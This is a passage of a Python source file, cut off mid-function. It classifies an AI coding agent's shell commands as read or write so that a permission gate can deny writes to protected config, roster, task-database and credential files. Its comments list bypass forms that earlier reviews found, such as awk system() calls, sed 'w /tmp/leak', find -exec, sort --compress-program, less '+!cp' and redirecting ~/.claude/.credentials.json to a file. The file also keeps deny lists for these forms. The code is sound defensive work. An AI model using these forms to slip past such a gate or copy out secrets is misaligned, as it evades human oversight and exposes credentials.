        # This closes over-block #5's sibling (`sed -n` on a hooks/system-config
        # file was denied as a #341 write because sed was absent from this set).
        "sed",
        "cut",
        "sort",
        "uniq",
        "tr",
        "column",
        "jq",
        "yq",
        "tac",
        "nl",
        "readlink",
        "realpath",
        "basename",
        "dirname",
        # Issue #1693 — additional unambiguously stdout-only viewers. Each
        # is a pure read filter with NO named-file output, in-place edit,
        # external-exec, or program-file flag surface, so a diagnostic read
        # (`strings <db>`, `hexdump -C <file>`, `comm a b`) is no longer
        # mis-classified write-intent and false-denied by the roster /
        # system-config / queue gates. Confirmed against their man pages:
        #   strings  — dumps printable strings to stdout; no output flag.
        #   hexdump  — hex/ASCII dump to stdout; no output flag.
        #   comm     — line-compares two sorted inputs to stdout; no output.
        #   fold     — wraps lines to stdout; no output flag.
        #   expand   — tabs→spaces to stdout; no output flag.
        #   paste    — merges lines to stdout; no output flag.
        #   csvlook  — csvkit pretty-printer to stdout; no output flag.
        # A shell `>`/`>>` redirect to a protected path is still caught by
        # the per-token write-redirect check, so a viewer cannot become a
        # write bypass. `bat`/`batcat` are deliberately NOT added: they
        # carry a pager-exec surface (`--pager`, `PAGER`/`BAT_PAGER`) that
        # would need its own guard (issue #1693 keeps scope minimal).
        "strings",
        "hexdump",
        "comm",
        "fold",
        "expand",
        "paste",
        "csvlook",
    }
)


# Issue #1014 C: provably non-mutating shell builtins that routinely
# appear as a *prelude* stage in a read pipeline — `cd ~/.agent-bridge &&
# grep BRIDGE agent-roster.local.sh`, `test -f roster && cat roster`,
# `echo "checking"; grep …`. None of these can mutate the filesystem:
# `cd`/`pwd` only move/print the working directory, `test`/`[` are
# read-only predicates, `echo`/`printf` write to stdout (any redirection
# is independently rejected by the per-token write-redirect check below),
# and `true`/`false`/`:` are no-ops. Before #1014 a neutral prelude stage
# disqualified the whole pipeline, so a routine `cd … && grep <protected>`
# read was mis-classified as a write and drew the write-oriented
# `config set` deny. Treating these stages as transparent does NOT widen
# the write surface — a genuine write stage (or any output redirection)
# anywhere in the pipeline still flips the classification to write-intent.
_NEUTRAL_PRELUDE_BASH_COMMANDS = frozenset(
    {
        "cd",
        "pushd",
        "popd",
        "pwd",
        "test",
        "[",
        "[[",
        "echo",
        "printf",
        "true",
        "false",
        ":",
    }
)


def _stage_first_token(stage: str) -> str:
    """Return the leading command word of a single pipeline stage.

    Strips a leading ``env`` invocation and any ``VAR=value`` assignment
    prefix so e.g. ``LC_ALL=C grep …`` still classifies as ``grep``.
    Returns ``""`` for an empty stage (which the caller skips).
    """
    parts = stage.strip().split()
    i = 0
    while i < len(parts):
        token = parts[i]
        if not token:
            i += 1
            continue
        # Strip leading-env style prefixes: `env`, `VAR=value`.
        if token == "env":
            i += 1
            continue
        if "=" in token and not token.startswith("-") and "/" not in token.split("=", 1)[0]:
            # Looks like `VAR=value`; skip.
            i += 1
            continue
        return token
    return ""


# Stderr-suppression / fd-dup forms that *look* like write redirection
# but cannot mutate the filesystem: `2>/dev/null` discards fd-2,
# `2>&1` merges fd-2 into fd-1, `&>/dev/null` discards both. These must
# not flip a read-intent classification (issue #574).
_SAFE_REDIRECT_PATTERNS = ("2>/dev/null", "2>&1", "&>/dev/null")

# Token-boundary regex used to strip the safe-redirect forms before
# operator splitting. Naive `str.replace` would also strip substrings
# like `2>/dev/null/extra` (a real write to a path *under* /dev/null/),
# turning a write into a fake read (issue #574 r2). The lookahead
# requires end-of-string or a true shell token-separator after the
# match — whitespace or one of `; & | ( ) < >`. `$` and backtick are
# excluded because they begin variable / command substitution and are
# not separators: `2>/dev/null$VAR` and ``2>/dev/null`cmd` `` are real
# writes to a substituted path, not stderr discards (issue #574 r3).
_SAFE_REDIRECT_RE = re.compile(
    r"(?:2>/dev/null|2>&1|&>/dev/null)(?=$|[\s;&|()<>])"
)

# Output-redirection token detector for `_is_read_intent_bash`.
#
# The prior `tok.startswith(("&>", "2>", ">>", ">"))` check missed numeric
# fd forms other than `2>`: e.g. `1>/tmp/leak`, `3>file`, `99>>log`. That
# let `cat ~/.claude/.credentials.json 1>/tmp/leak` slip through as
# read-intent and bypass the admin credential carve-out's deny mirror
# (codex PR #881 r1 finding 1).
#
# Match shape: optional digit run, then `>` or `>>`. Anchored to the
# start of the token because `_is_read_intent_bash` operates on the
# whitespace-split tokens of a stage; an embedded `2>` inside a quoted
# string never reaches this check.
_NUMERIC_FD_WRITE_RE = re.compile(r"^[0-9]+>>?")


# Issue #1255 r3/r4 — `find` mutation/exec primitive filter.
#
# `find` is on `_READ_INTENT_BASH_COMMANDS` because the common operator
# diagnostics (`find <roster> -name "*.sh"`, `find <roster> -type f`)
# are pure reads. But find has built-in mutation and exec primitives
# that the bare leader check does not see — `find -delete` removes
# matches in place, and `find -exec` / `-execdir` / `-ok` / `-okdir`
# spawn arbitrary subprocesses against each match. The GNU-find file
# actions `-fprint` / `-fprint0` / `-fprintf` / `-fls` write matches
# (or `-ls`-style listings) to a file the operator names, which is a
# roster-exfil channel even though no `>` token appears in the command
# (codex PR #1294 r2 first surfaced `-fprint*`; r3 added `-fls`).
#
# Treat these flags as write-intent: when `find` is the stage leader
# and any of them appears in argv, the stage falls out of the read-
# intent classification. The output-redirection guard above already
# catches `find -ls > somefile`; we do not need to enumerate that form
# here.
#
# Comprehensive audit pass (codex PR #1294 r3, GNU find(1) actions):
#   - `-delete`, `-exec`, `-execdir`, `-ok`, `-okdir` — covered.
#   - `-fprint`, `-fprint0`, `-fprintf` — covered.
#   - `-fls` — covered (this commit).
#   - `-ls`, `-print`, `-print0`, `-printf`, `-quit` — write stdout
#     only; the output-redirection guard catches `> file` rebinding.
#   - `-prune` — pure traversal control, no I/O.
# No other GNU find action writes to a named file or spawns a child
# without `>` redirect; the frozenset is now exhaustive for the file-
# action + child-spawn classes.
_FIND_MUTATION_FLAGS = frozenset(
    {
        "-delete",
        "-exec",
        "-execdir",
        "-ok",
        "-okdir",
        "-fprint",
        "-fprint0",
        "-fprintf",
        "-fls",
    }
)


# sed program write/exfil commands that need NO `-i` flag and no shell `>`
# token: `[addr]w file` / `[addr]W file` write the pattern space / first line
# to a file; `s/re/repl/w file` writes substituted lines; `[addr]r file` /
# `[addr]R file` READ an external file (a leak when its content is then
# printed). All take a FILENAME after the command letter + whitespace, so they
# are detectable without the noise of matching a bare `w`/`r` inside a
# replacement string. Like the awk in-program markers (#1690), any of these in
# the sed PROGRAM drops read-intent (fail-closed).
#
# Pattern: the command letter sits at the program start or after a command
# separator / address close (`;`, newline, `}`, or an address regex's closing
# `/`), is one of w/W/r/R, and is followed by whitespace + a filename, or
# directly by a `/`-rooted path (sed's `w` takes the rest of the line as the
# filename, so `w/tmp/leak` with no space still writes) — OR a substitute
# command carries a `w` write flag (`s/re/repl/[flags]w file`). The leading `-e`
# flag letter is stripped before the scan so `-ew/tmp/leak` is seen as `w/...`.
_SED_WRITE_COMMAND_RE = re.compile(r"(?:^|[;\n}/])\s*[wWrR](?:\s+\S|/)")
_SED_SUBSTITUTE_WRITE_RE = re.compile(r"s(.).*?\1.*?\1[0-9gpiImMe]*w\b")


def _sed_is_read_only(stage_tokens: list[str]) -> bool:
    """Issue #1806 (3d): True iff a `sed` invocation is provably a pure read.

    `sed` is on `_READ_INTENT_BASH_COMMANDS` because `sed -n 1,5p <file>` is a
    pure stdout read. The read→write escalations are:

      1. The in-place edit flag — GNU `-i` / `-i.bak` / `--in-place[=.bak]`,
         BSD `-i ''`, and any short cluster containing `i` (`-ni` / `-ne -i`).
      2. A PROGRAM write/exfil command that needs NO `-i` and no shell `>`:
         `[addr]w file` / `[addr]W file` (write pattern space to a file),
         `s/re/repl/…w file` (write substituted lines), `[addr]r/R file` (read
         an external file). These live INSIDE the sed script shell-word, so the
         per-token output-redirect check never sees them — exactly the
         awk-program problem (#1690).

    Returns False (→ write-intent, deny) on EITHER escalation. Re-tokenizes via
    `_shell_words_with_expansion` (like `_awk_is_read_only`) so a quoted script
    containing whitespace (`sed 'w /tmp/leak'`) is recovered as ONE word, and
    fails closed when a script word is hidden by a `$VAR`/`$(…)` expansion or
    an unbalanced quote. Plain `sed -n 1,40p`, `sed 's/a/b/'`, `sed '/re/d'`
    reads stay read-intent.
    """
    try:
        words = _shell_words_with_expansion(" ".join(stage_tokens))
    except ValueError:
        return False  # unbalanced quote → un-parseable → fail-closed
    args = words[1:]  # skip the leading 'sed'
    saw_ddash = False
    seen_script = False
    for value, shell_expanded in args:
        tok = value
        if saw_ddash:
            if _sed_program_has_write_command(tok):
                return False
            continue
        if tok == "--":
            saw_ddash = True
            continue
        if tok.startswith("--"):
            if tok == "--in-place" or tok.startswith("--in-place"):
                return False
            if "=" in tok:
                _flag, _val = tok.split("=", 1)
                if _sed_program_has_write_command(_val):
                    return False
            continue
        if tok.startswith("-") and tok != "-":
            cluster = tok[1:]
            if "i" in cluster:
                return False
            if "e" in cluster:
                # `-e <script>` carries the script glued (`-e'…'`) or in the
                # NEXT positional; scan a glued tail here. A separate next-token
                # script is handled as a positional below.
                tail = cluster.split("e", 1)[1]
                if tail and _sed_program_has_write_command(tail):
                    return False
            continue
        # A positional: the FIRST one is the sed script (when no -e/-f gave it);
        # later positionals are file paths. A `$VAR`-hidden script word can
        # smuggle a write command past the static scan → fail closed.
        if not seen_script:
            seen_script = True
            if shell_expanded:
                return False
        if _sed_program_has_write_command(tok):
            return False
    return True


def _sed_program_has_write_command(program: str) -> bool:
    """Conservative scan of a sed PROGRAM/script token for a write/exfil
    command (`[addr]w file`, `[addr]W file`, `[addr]r/R file`) or a
    `s/re/repl/…w file` substitute-write flag.

    Fail-closed but precise enough not to trip on a `w`/`r` inside a
    replacement string (`s/foo/word/`): the command form requires the letter in
    a command position (program start / after `;`/newline/`}` / address-close
    `/`) followed by whitespace + a filename. This never lets `sed 'w
    /tmp/leak'` or `sed -n 's/x/y/w /tmp/leak'` ride the read-intent carve-out,
    while `sed -n 1,40p`, `sed 's/a/b/'`, `sed '/re/d'` stay read-only.
    """
    if not program:
        return False
    if _SED_WRITE_COMMAND_RE.search(program):
        return True
    if _SED_SUBSTITUTE_WRITE_RE.search(program):
        return True
    return False


def _find_is_read_only(stage_tokens: list[str]) -> bool:
    """Return True iff a `find` invocation is free of mutation/exec flags.

    *stage_tokens* is the whitespace-split argv of a single pipeline
    stage whose leader has already been confirmed to be `find` (or a
    pathy equivalent like `/usr/bin/find`). Returns False as soon as
    any token equals one of :data:`_FIND_MUTATION_FLAGS` so the caller
    can drop the read-intent classification.

    The check is exact-match per token: `-delete` matches but
    `-deleted-files` does not, and `-delete` is rejected even when it
    appears mid-argv (`find <path> -type f -delete`). This is the
    flag shape `find` itself enforces — none of the mutation primitives
    take an inline value glued to the flag (find takes them as separate
    argv elements). See codex PR #1294 r2 for the BLOCKING-class repro
    that motivated the filter.

    Issue #1690 r2 (codex sweep): quote-strip each token before the
    match — a shell-quoted `"-exec"` / `'-delete'` arrives as a raw token
    with embedded quotes, so a bare equality test would miss it and let
    `find <db> "-exec" cp <db> sink {} \\;` ride the read carve-out. The
    shell removes the quotes before `find` sees the flag, so we must too.
    """
    for raw_token in stage_tokens[1:]:  # skip the leading 'find'
        if _strip_token_quotes(raw_token) in _FIND_MUTATION_FLAGS:
            return False
    return True


# Issue #1690 — `awk` program write/exec/pipe primitive filter.
#
# `awk` is on `_READ_INTENT_BASH_COMMANDS` because the common operator
# diagnostic (`awk '{print $2}' <file>`, `awk -F: '{print $1}' <file>`)
# is a pure read. But unlike `cat`/`grep`, awk has IN-PROGRAM write,
# exec and pipe primitives that need NO shell `>` redirection token, so
# the per-token output-redirect check in `_is_read_intent_bash` never
# sees them (the whole awk program is a single quoted argv token whose
# leading char is `{`/`'`, not `>`):
#   awk '{print > "/tmp/leak"}'  <db>          # in-program file write
#   awk '{print >> "/tmp/leak"}' <db>          # in-program file append
#   awk '{print | "cmd"}'        <db>          # pipe to a command
#   awk 'BEGIN{system("cp <db> /tmp/copy")}'   # spawn a subprocess
#   awk '{getline x < "cmd"}'    <db>          # read from a command/file
# Codex direction-review of #1690 demonstrated the first two as a real
# tasks.db exfil that rode the new read-intent carve-out. The pre-existing
# `awk -i inplace` flag check (in `_is_read_intent_bash`) only covers the
# in-place flag, not these program-body primitives.
#
# Conservative posture: scan the awk PROGRAM text (every argv token after
# the leader, minus flags) for any of the write/exec/pipe primitives. A
# plain `print` / `printf` to stdout (no `>`/`|`) stays read-intent; the
# moment a `>` / `>>` / `|` / `system` / `getline` / `close` / `fflush`
# appears in the program the whole stage drops to write-intent. We do NOT
# attempt to parse awk semantics — fail-closed on any of these markers.
_AWK_PROGRAM_WRITE_MARKERS = (
    ">",        # print/printf to a file (also catches >>)
    "|",        # pipe to a command (print | "cmd", "cmd" | getline)
    "system",   # awk system() spawns a subprocess
    "getline",  # getline < file / cmd | getline reads an external source
    "close",    # close() flushes a write/pipe target
    "fflush",   # fflush() flushes a write/pipe target
    # gawk `@include "file"` / `@load "ext"` directives load external
    # program / shared-extension code that can carry a system()/print>file.
    # The flag-position `@include`/`@load` is already fail-closed in the
    # allowlist loop, but a leading space/comment/newline makes the
    # directive part of the INLINE program word (`awk ' @include "evil"'
    # <db>`), so it must also be a program marker (issue #1690 r3 codex).
    "@include",
    "@load",
)


def _shell_words_with_expansion(text: str) -> list[tuple[str, bool]]:
    """Split *text* into shell words, returning ``(value, shell_expanded)``
    per word.

    *value* approximates the post-quote-removal word (like
    :func:`shlex.split`). *shell_expanded* is True when the word contains a
    ``$``-parameter/command expansion or a backtick OUTSIDE single quotes —
    i.e. the shell would rewrite the word before the command sees it, so
    its real content is unknown to us. Single-quoted ``$`` (an awk field
    ref like ``$1``/``$NF`` in ``'{print $1}'``) is NOT flagged; a double-
    quoted or unquoted ``$VAR`` / ``$(...)`` / `` `...` `` IS.

    This lets a caller scope the "content is hidden by the shell" check to
    a SPECIFIC word (e.g. the awk PROGRAM word) rather than the whole
    command, so a benign expansion in a DATA-FILE path (`awk '{print $1}'
    $HOME/data`) does not over-block the read (issue #1690 r3).

    Raises ``ValueError`` on an unterminated quote (caller fails closed).
    """
    words: list[tuple[str, bool]] = []
    cur: list[str] = []
    cur_expanded = False
    in_word = False
    in_sq = False
    in_dq = False
    i = 0
    n = len(text)

    def flush() -> None:
        nonlocal cur, cur_expanded, in_word
        if in_word:
            words.append(("".join(cur), cur_expanded))
        cur = []
        cur_expanded = False
        in_word = False

    while i < n:
        c = text[i]
        if in_sq:
            in_word = True
            if c == "'":
                in_sq = False
            else:
                cur.append(c)
        elif in_dq:
            in_word = True
            if c == "\\" and i + 1 < n:
                cur.append(text[i + 1])
                i += 2
                continue
            if c == '"':
                in_dq = False
            elif c in ("$", "`"):
                cur_expanded = True
                cur.append(c)
            else:
                cur.append(c)
        else:
            if c == "'":
                in_sq = True
                in_word = True
            elif c == '"':
                in_dq = True
                in_word = True
            elif c == "\\" and i + 1 < n:
                cur.append(text[i + 1])
                in_word = True
                i += 2
                continue
            elif c.isspace():
                flush()
            elif c in ("$", "`"):
                cur_expanded = True
                cur.append(c)
                in_word = True
            else:
                cur.append(c)
                in_word = True
        i += 1
    if in_sq or in_dq:
        raise ValueError("unterminated quote")
    flush()
    return words


def _awk_is_read_only(stage_tokens: list[str]) -> bool:
    """Return True iff an `awk` invocation has no in-program write/exec/pipe.

    *stage_tokens* is the whitespace-split argv of a single pipeline
    stage whose leader is `awk` (or a pathy equivalent). Two stages:

    1. Flag allowlist: every flag must be a known benign POSIX/gawk flag
       that takes no file and carries no exec/write surface. Any
       program/extension loader, file-write flag, `-W` meta-flag, or
       unknown flag fails closed.
    2. Program marker scan: ONLY the awk PROGRAM word (the first non-flag
       positional) is scanned for the write/exec/pipe markers in
       :data:`_AWK_PROGRAM_WRITE_MARKERS`. The real exfil primitives
       (`print > "f"`, `print | "cmd"`, `system()`, `getline`, `close`,
       `fflush`) all live INSIDE that one shell word, so scanning only it
       preserves security while avoiding the false-positive that scanning
       *all* args caused (issue #1690 r3): a marker in a `-F`/`-v` flag
       VALUE (`awk -F '|' …`) or in an INPUT-FILE-PATH positional
       (`awk '{print $1}' lib/system_config_paths.py` — "system") wrongly
       denied legitimate reads #1690 was meant to unblock.

    Tokenisation uses `shlex` so the awk PROGRAM is recovered as the single
    shell word awk itself receives (`awk '{print | "cmd"}' <db>` → program
    word `{print | "cmd"}`), even when it contains whitespace. Whitespace-
    split tokens cannot do this — `'{print` / `|` / `"cmd"}'` would split
    the `|` marker away from the program word and miss it. Fail-closed on a
    shlex parse failure (unbalanced quotes) and within the program word: we
    do not parse awk grammar, so a marker anywhere in the program — even
    inside a string the parser would treat as data — flips to write-intent.
    """
    # Re-tokenise so the program is one shell word (awk's own argv shape),
    # not whitespace fragments. `_shell_words_with_expansion` also reports,
    # per word, whether the shell EXPANDED it (a `$VAR`/`$(…)`/backtick
    # outside single quotes), so we can fail closed when the awk PROGRAM
    # word's real content is hidden by an expansion — e.g.
    # `p='BEGIN{system("id")}'; awk "$p" <db>` (issue #1690 r3). Rejoining
    # the already-split tokens with single spaces is faithful: shell word
    # boundaries are preserved by the quotes, and collapsing internal
    # whitespace runs does not change the substring-marker result.
    try:
        words = _shell_words_with_expansion(" ".join(stage_tokens))
    except ValueError:
        return False  # unbalanced quote → un-parseable → fail-closed
    args = words[1:]  # skip the leading 'awk' (value, expanded) pairs
    # Issue #1690 r2 — awk option handling is an ALLOWLIST, not a denylist.
    # gawk has a large, ever-growing set of flags that load an external
    # PROGRAM/EXTENSION (`-f`/`--file`/`--source`/`-e`/`-E`/`--exec`/
    # `-i`/`--include`/`@include`/`-l`/`--load`/`@load`), WRITE a named file
    # (`-o`/`--pretty-print`, `-p`/`--profile`, `-d`/`--dump-variables`,
    # `--gen-pot`), or expose an exec surface (`-D`/`--debug`, and the
    # `-W <gawk-option>` meta-flag that aliases all of the above). Codex
    # re-review found these one-at-a-time across several rounds; a denylist
    # cannot keep up. Flip to a tiny benign-flag allowlist: only the POSIX/
    # common awk flags that take NO file and carry NO exec/write surface are
    # accepted; ANY other flag (or `@`-directive, or `-W` meta-flag) flips
    # the stage to write-intent (fail-closed). The operator's read need
    # (`awk '{print $N}' <f>`, `awk -F: …`, `awk -v x=1 …`) is fully
    # covered. `-F`/`--field-separator` and `-v`/`--assign` take a value
    # (separate token or glued); the value is NOT scanned for markers.
    _AWK_BENIGN_NOVALUE = {
        "-b", "--characters-as-bytes",
        "-c", "--traditional", "--compat",
        "-C", "--copyright",
        "-g", "--gen-po",  # extracts strings to STDOUT (not the file-writing --gen-pot)
        "-M", "--bignum",  # arbitrary-precision arithmetic — no file/exec surface
        "-n", "--non-decimal-data",
        "-O", "--optimize",
        "-P", "--posix",
        "-r", "--re-interval",
        "-S", "--sandbox",  # gawk: disables system()/getline-pipe/file-output
        "-V", "--version",
        "--help", "--usage",
    }
    _AWK_BENIGN_VALUED = {"-F", "--field-separator", "-v", "--assign"}
    program: str | None = None  # the first non-flag positional = awk program
    program_expanded = False  # was the program word shell-expanded?
    skip_next = False
    for tok, expanded in args:
        if skip_next:
            skip_next = False
            continue  # this word is a benign flag's VALUE — not scanned
        if not tok.startswith(("-", "@")) or tok == "-":
            # A non-flag positional. The FIRST one is the awk program (only
            # reached when no -f/-e/--source loaded it from a file — those
            # return False above). Subsequent positionals are INPUT DATA
            # FILES and must NOT be scanned for markers (issue #1690 r3:
            # `awk '{print $1}' lib/system_config_paths.py` — the path
            # contains "system" but is not the program).
            if program is None:
                program = tok
                program_expanded = expanded
            continue
        if tok == "--":
            continue  # end-of-options marker
        bare = tok.split("=", 1)[0]
        if tok in _AWK_BENIGN_NOVALUE or bare in _AWK_BENIGN_NOVALUE:
            continue
        if tok in _AWK_BENIGN_VALUED:
            skip_next = True  # the following word is this flag's value
            continue
        if bare in _AWK_BENIGN_VALUED:
            continue  # glued `--field-separator=:` / `-F:` / `-vx=1`
        # short glued benign-valued: `-F:` / `-vFS=,`.
        if tok[:2] in ("-F", "-v") and len(tok) > 2:
            continue
        # Anything else — program/extension loader, file-write flag, the
        # `-W` meta-flag, an unknown gawk option, or an `@`-directive — is
        # NOT a benign read flag. Fail-closed.
        return False
    if program is None:
        return True  # no inline program (e.g. only flags); nothing to scan
    # Issue #1690 r3: if the PROGRAM word was shell-expanded (a double-
    # quoted / unquoted `$VAR` / `$(…)` / backtick — NOT a single-quoted
    # awk `$1` field ref), its real content was rewritten by the shell
    # before awk saw it, so the marker scan would miss a hidden
    # `system(...)`/`print > …`. `p='BEGIN{system("id")}'; awk "$p" <db>`
    # is exactly this. Fail-closed: an awk program we cannot read is never
    # a safe read.
    if program_expanded:
        return False
    # The quotes have been removed, so the program word is the effective
    # program awk runs (the round-5 adjacent-quote `'syst''em'` case
    # collapses to `system` here automatically).
    return not any(marker in program for marker in _AWK_PROGRAM_WRITE_MARKERS)


# Issue #1690 (codex direction-review rounds 2-3) — per-command output/
# exec flag filter. Several leaders on `_READ_INTENT_BASH_COMMANDS` look
# like pure readers but ship their OWN named-file output, in-place edit,
# external-command, or pager-startup-command primitive that needs no
# shell `>` redirection token, so the leader-only check + the per-token
# `>` check both miss them. Codex re-review found these riding the
# tasks.db read-intent carve-out as exfil / RCE:
#   sort -o /tmp/leak <db>                # -o / --output writes to a file
#   sort --compress-program='sh -c …'     # runs an external program (RCE)
#   xxd <db> /tmp/leak                     # 2nd positional = output; -r patches
#   less -o /tmp/leak <db>                 # -o / --log-file logs to a file
#   less '+!cp <db> sink' <db>             # +cmd pager startup runs a shell cmd
#   more '+!cp <db> sink' <db>             # same +cmd pager-startup exec
#   view -c 'w! /tmp/leak' <db>            # ex `:w` write via -c
#   view '+w! /tmp/leak' <db>              # ex `:w` write via +cmd
#   rg --pre 'sh -c "cp <db> sink"'        # --pre runs an arbitrary preproc
#
# Each is handled with the narrowest rule that still fails closed; benign
# diagnostic reads (`sort <db>`, `xxd <db>`, `less <db>`, `rg pat <db>`,
# `view <db>`) carry none of these and stay read-intent. The pagers
# (`less`/`more`/`view`) reject ANY `+cmd` startup token, since `+cmd`
# only exists to run a pager/ex command (search/save/shell), never a
# benign file read.
_SORT_OUTPUT_FLAGS = ("-o", "--output")
# sort's external-program flag (RCE) — exact match or `--flag=value` glued.
_SORT_EXEC_FLAGS = ("--compress-program",)
# less write/exec flags: `-o`/`-O`/`--log-file` write the session to a
# named file; `-k`/`--lesskey-file`/`--lesskey-src`/`--lesskey-context`
# load a lesskey source that can set `#env` directives (e.g. LESSOPEN=|cmd
# input preprocessor → RCE/exfil), the same exec surface the LESSOPEN env
# prefix already blocks (issue #1690 r2 codex consolidated sweep).
_LESS_OUTPUT_FLAGS = (
    "-o", "-O", "--log-file", "--LOG-FILE",
    "-k", "--lesskey-file", "--lesskey-src", "--lesskey-context",
)
# `view` (read-only vi) benign-flag ALLOWLIST (issue #1690 r2). vim has a
# huge flag surface — ex-command / script / startup-config / write-file /
# verbose-to-file flags all turn `view` into an exec/write surface, and a
# denylist could not keep up (codex sweep found -u, then --startuptime /
# --log / -V one-at-a-time). Only these no-file, no-exec mode toggles are
# accepted; every other flag is fail-closed. The operator's read need is
# just `view <file>`. Bare-letter mode toggles (case-sensitive):
#   -R readonly · -M/-m modifiability off · -n no-swap · -b binary ·
#   -l lisp · -C/-N compatible · -Z restricted · -x no-crypt-prompt ·
#   -A/-H/-F language modes. Ex/silent mode (`-e`/`-es`/…) is deliberately
#   NOT benign — it reads ex commands from stdin (a write/exec surface).
_VIEW_BENIGN_FLAGS = frozenset(
    {
        "-R", "-M", "-m", "-n", "-b", "-l", "-C", "-N", "-Z", "-x",
        "-A", "-H", "-F",
        "--noplugin", "--not-a-term", "--clean",
    }
)
# Pager leaders whose `+cmd` startup argument runs a pager/ex command
# (search / save-to-file / shell-out / pipe) — never a benign file read.
_PAGER_PLUS_CMD_LEADERS = frozenset({"less", "more", "view"})


def _strip_token_quotes(token: str) -> str:
    """Strip a single layer of surrounding matched quotes from a raw argv
    token. `_is_read_intent_bash` operates on whitespace-split tokens with
    quotes NOT removed (no shlex), so `'+w!'` arrives as the literal
    `'+w!'`; the leading quote would hide a `+cmd`/flag prefix check. Only
    strips when both ends match (`'…'` or `"…"`); leaves unbalanced or
    quote-free tokens unchanged."""
    if len(token) >= 2 and token[0] in ("'", '"') and token[-1] == token[0]:
        return token[1:-1]
    # Leading-only quote (the arg's closing quote is a separate token after
    # a space, e.g. `'+w!` + `/tmp/leak'`): strip just the leading quote so
    # the `+`/flag prefix is still detected.
    if token[:1] in ("'", '"'):
        return token[1:]
    return token


def _flag_or_valued(token: str, flags: tuple[str, ...]) -> bool:
    """True if *token* is one of *flags*, or a `--flag=value` / `-oVALUE`
    glued form of one of them. Quote-stripped so `'-o'` / `"--output=x"`
    are recognised."""
    token = _strip_token_quotes(token)
    for flag in flags:
        if token == flag:
            return True
        if flag.startswith("--") and token.startswith(flag + "="):
            return True
        # short-flag glued value: `-o/tmp/leak` for `-o`.
        if not flag.startswith("--") and len(flag) == 2 and token.startswith(flag) and len(token) > 2:
            return True
    return False


def _named_read_leader_is_read_only(leaf: str, stage_tokens: list[str]) -> bool:
    """Return False iff a read-intent leader carries its own named-file
    output flag, in-place/external-exec flag, pager `+cmd` startup, or
    output-file positional that would write/exfil/RCE without a shell `>`
    token. Returns True (read-only) for leaders this filter does not
    constrain or for benign invocations.
    """
    args = stage_tokens[1:]
    # Pager `+cmd` startup (less/more/view) runs a pager/ex command —
    # search, save-to-file (`+s file` / `+w! file`), shell-out (`+!cmd`),
    # or pipe. Quote-stripped so `'+w! …'` is caught. Never a benign read.
    if leaf in _PAGER_PLUS_CMD_LEADERS:
        if any(_strip_token_quotes(t).startswith("+") for t in args):
            return False
    if leaf == "sort":
        if any(_flag_or_valued(t, _SORT_OUTPUT_FLAGS) for t in args):
            return False
        # --compress-program / --compress-program=CMD runs an external
        # program; treat the flag (and its glued/separate value) as exec.
        return not any(_flag_or_valued(t, _SORT_EXEC_FLAGS) for t in args)
    if leaf == "less":
        return not any(_flag_or_valued(t, _LESS_OUTPUT_FLAGS) for t in args)
    if leaf == "more":
        # `more` has no named-output flag of its own beyond the +cmd
        # startup handled above; nothing more to constrain.
        return True
    if leaf == "view":
        # `view` is read-only vi, but vim has a huge flag surface that can
        # run an ex `:w`/`:!` or WRITE a named file: -c/--cmd/+cmd (ex cmd),
        # -s/-S (sourced script), -u/-U (arbitrary startup config), -i
        # (viminfo/shada write), -w/-W (script-out write), --startuptime
        # FILE / --log FILE / -V[N]FILE (verbose-to-file write), -r FILE
        # (recovery). A denylist cannot keep up with the vim option set
        # (issue #1690 r2 codex sweep found -u, then --startuptime/--log/-V
        # one-at-a-time), so — like awk — use a tiny benign-flag ALLOWLIST:
        # only the no-file, no-exec mode toggles are accepted; ANY other
        # flag flips to write-intent (fail-closed). The operator's read need
        # is just `view <file>`. (+cmd is already rejected above.)
        # Quote-strip before classification: a shell-quoted flag like
        # `"-c"` / `'-c'` arrives with embedded quotes, so a naive
        # `startswith("-")` would misclassify it as the file path and let
        # `view "-c" "w! sink" <db>` ride the carve-out (issue #1690 r2
        # codex sweep). The shell removes the quotes before vim sees the
        # flag, so we must too.
        for raw_tok in args:
            tok = _strip_token_quotes(raw_tok)
            if not tok.startswith("-") or tok == "-":
                continue  # the file path (or `-` stdin)
            if tok == "--":
                continue
            bare = tok.split("=", 1)[0]
            if bare in _VIEW_BENIGN_FLAGS:
                continue
            return False
        return True
    if leaf == "rg":
        # `--pre` / `--pre=CMD` runs an arbitrary preprocessor (RCE/exfil).
        return not any(
            _strip_token_quotes(t) == "--pre"
            or _strip_token_quotes(t).startswith("--pre=")
            for t in args
        )
    if leaf == "xxd":
        # xxd writes its dump to a SECOND positional file arg
        # (`xxd infile outfile`) — even a bare relative name in CWD — and
        # `-r`/`-revert` patches binary back. Fail-closed: reject `-r`, and
        # reject 2+ positionals (input + output). We skip the VALUES of
        # xxd's valued flags (`-s`/`-l`/`-c`/`-g`/`-o` and their `-R`
        # when/never form) so a numeric flag value is not mistaken for the
        # output positional; everything else after the flags is a file
        # positional and a second one is the write target.
        xxd_valued = {"-s", "-l", "-c", "-g", "-o", "-R"}
        positionals = []
        skip_next = False
        for raw_tok in args:
            if skip_next:
                skip_next = False
                continue
            # Quote-strip before flag classification so a quoted flag like
            # `"-s"` is recognised (issue #1690 r2): otherwise its value
            # would be miscounted as the output positional (an over-block).
            tok = _strip_token_quotes(raw_tok)
            if tok in ("-r", "-revert"):
                return False
            if tok in xxd_valued:
                skip_next = True  # the following token is this flag's value
                continue
            if tok.startswith("-"):
                continue  # other (glued or no-value) flag
            positionals.append(tok)
        if len(positionals) >= 2:
            return False
        return True
    if leaf == "uniq":
        # Issue #1690 r2 (patch adversarial review): `uniq [opts] [INPUT
        # [OUTPUT]]` — the SECOND positional is an OUTPUT file (write/
        # exfil), e.g. `uniq <db> /tmp/leak` or `uniq -c <db> /tmp/leak`.
        # Same shape as xxd. Reject 2+ positionals (input + output). Skip
        # the VALUES of uniq's argument-taking flags (`-f`/--skip-fields,
        # `-s`/--skip-chars, `-w`/--check-chars; GNU `--all-repeated` /
        # `--group` take their arg glued via `=`) so a numeric flag value
        # is not miscounted as the output positional. `-D`/`-d`/`-u`/`-c`/
        # `-i`/`-z` take no separate value.
        uniq_valued = {"-f", "-s", "-w"}
        positionals = []
        skip_next = False
        for raw_tok in args:
            if skip_next:
                skip_next = False
                continue
            # Quote-strip before flag classification (issue #1690 r2) so a
            # quoted `"-f"` is recognised and its value not miscounted as
            # the output positional (an over-block).
            tok = _strip_token_quotes(raw_tok)
            if tok in uniq_valued:
                skip_next = True  # the following token is this flag's value
                continue
            if tok.startswith("-"):
                continue  # glued / no-value / long flag (e.g. -f2, --count)
            positionals.append(tok)
        if len(positionals) >= 2:
